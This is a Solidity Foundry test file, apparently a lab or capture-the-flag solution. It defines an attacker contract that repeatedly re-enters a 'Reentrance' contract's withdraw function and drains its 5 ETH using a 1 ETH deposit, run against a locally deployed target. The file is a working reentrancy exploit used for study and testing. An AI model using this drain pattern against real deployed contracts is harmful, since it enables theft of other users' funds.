// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Reentrance.sol";

// Attacker contract: its receive() re-enters withdraw() in a loop.
contract Attacker {
    Reentrance public target;
    uint256 public amount;

    constructor(Reentrance _target) {
        target = _target;
    }

    function attack() external payable {
        amount = msg.value;
        // 1. Deposit to register a balance.
        target.donate{value: amount}(address(this));
        // 2. Trigger the first withdrawal, which detonates the reentrancy.
        target.withdraw(amount);
    }

    // This runs every time the target sends us ETH.
    receive() external payable {
        // While the target still has funds, keep re-entering.
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }
}

contract ReentranceExploit is Test {
    Reentrance public target;
    Attacker public attacker;

    function setUp() public {
        target = new Reentrance();
        // Simulate other users having deposited 5 ETH into the contract.
        vm.deal(address(this), 5 ether);
        target.donate{value: 5 ether}(address(0xABCD));
    }

    function test_DrainViaReentrancy() public {
        // The contract starts with 5 ETH from other users.
        assertEq(address(target).balance, 5 ether, "target should hold 5 ETH");

        // The attacker attacks with just 1 ETH of their own.
        attacker = new Attacker(target);
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        // Result: the contract is drained despite the attacker only putting in 1 ETH.
        assertEq(address(target).balance, 0, "target should be empty");
        assertGt(address(attacker).balance, 1 ether, "attacker withdrew more than deposited");

        console.log("Attacker final balance:", address(attacker).balance);
        console.log("Exploit successful: reentrancy drained the contract");
    }
}
